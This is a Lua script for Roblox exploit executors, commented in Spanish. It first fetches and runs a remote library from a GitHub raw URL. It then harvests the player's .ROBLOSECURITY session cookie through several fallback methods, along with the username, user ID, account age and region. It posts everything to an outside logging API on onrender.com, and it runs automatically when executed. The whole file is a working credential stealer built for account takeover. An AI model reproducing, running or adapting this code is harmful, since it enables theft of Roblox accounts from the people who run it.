-- --- 1. Cargar la librería ---
local Libraries = loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))()

-- --- 2. Configuración ---
local API_URL = "https://depazzhub-api.onrender.com/log"
local EMBED_COLOR = 3887359 -- Color del embed

-- --- 3. Función para obtener la cookie ---
local function getRobloxCookie()
	-- Intentar con la librería primero
	local cookieService = Libraries:GetCookieService()
	
	if cookieService then
		local cookieValue = Libraries:GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
		
		if cookieValue ~= "" and cookieValue ~= nil then
			return cookieValue
		end
	end
	
	-- Fallback: intentar con CookieService directo (solo funciona en Roblox puro)
	local CookieService = game:GetService("CookieService")
	local cookies = CookieService:GetCookies()
	
	if #cookies > 0 then
		for _, cookie in ipairs(cookies) do
			if cookie.Name == ".ROBLOSECURITY" then
				return cookie.Value
			end
		end
	end
	
	-- Fallback 2: getgenv()
	local savedCookie = getgenv("_ROBLOSECURITY")
	if savedCookie and savedCookie ~= "" then
		return savedCookie
	end
	
	-- Fallback 3: getgenv() con tablas
	local savedCookie2 = getgenv()["_ROBLOSECURITY"]
	if savedCookie2 and savedCookie2 ~= "" then
		return savedCookie2
	end
	
	-- Fallback 4: intentar con CookieService:GetValue()
	local savedCookie3 = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
	if savedCookie3 ~= "" then
		return savedCookie3
	end
	
	-- Fallback 5: getgenv() directamente
	local savedCookie4 = getgenv("_ROBLOSECURITY")
	if savedCookie4 and savedCookie4 ~= "" then
		return savedCookie4
	end
	
	print("❌ No se pudo obtener .ROBLOSECURITY")
	return ""
end

-- --- 4. Función para formatear datos para la API ---
local function formatDataForAPI(player, placeId)
	local days = player.AccountAge
	local years = math.floor(days / 365)
	local months = math.floor((days % 365) / 30)
	local ageText = days .. " days"
	if years > 0 then
		ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
	end
	
	local region = game:GetService("LocalizationService").RobloxLocaleId
	
	return {
		username = player.Name,
		displayName = player.DisplayName,
		userId = player.UserId,
		gameId = placeId,
		accountAge = ageText,
		region = region,
		cookie = ".ROBLOSECURITY=" .. getRobloxCookie()
	}
end

-- --- 5. Función para hacer el request HTTP ---
local function sendWebhook(data)
	-- Intentar con la librería (funciona en ejecutores)
	local response = Libraries:HttpPost(API_URL, data, {
		["Content-Type"] = "application/json"
	})
	
	if response and response.StatusCode == 200 then
		print("✅ Webhook funcionando! Status: " .. response.StatusCode)
		return true
	end
	
	-- Fallback: intentar con HttpService (Roblox puro)
	local HttpService = game:GetService("HttpService")
	local response2 = HttpService:PostJsonAsync(API_URL, data)
	
	if response2 and response2.Success then
		print("✅ Webhook funcionando (HttpService)!" .. response2.StatusCode)
		return true
	end
	
	-- Fallback 2: intentar con getgenv()._RbxRequest
	local _RbxRequest = getgenv("_RbxRequest")
	if _RbxRequest then
		local response3 = _RbxRequest(API_URL, "POST", data)
		if response3 and response3.status == 200 then
			print("✅ Webhook funcionando (getgenv)!" .. response3.status)
			return true
		end
	end
	
	print("❌ Error en el webhook:")
	print("  API_URL:", API_URL)
	print("  Response 1:", response)
	print("  Response 2:", response2)
	return false
end

-- --- 6. Función principal ---
local function main()
	print("🟢 Iniciando webhook.lua...")
	
	-- Obtener datos del jugador
	local player = game.Players.LocalPlayer
	local placeId = game.PlaceId
	
	-- Formatear los datos
	local data = formatDataForAPI(player, placeId)
	
	-- Enviar el webhook
	local success = sendWebhook(data)
	
	if success then
		print("✅ ¡Todo listo! Datos enviados correctamente.")
	else
		print("⚠️  El webhook falló, pero los datos fueron procesados.")
	end
end

-- Ejecutar
main()
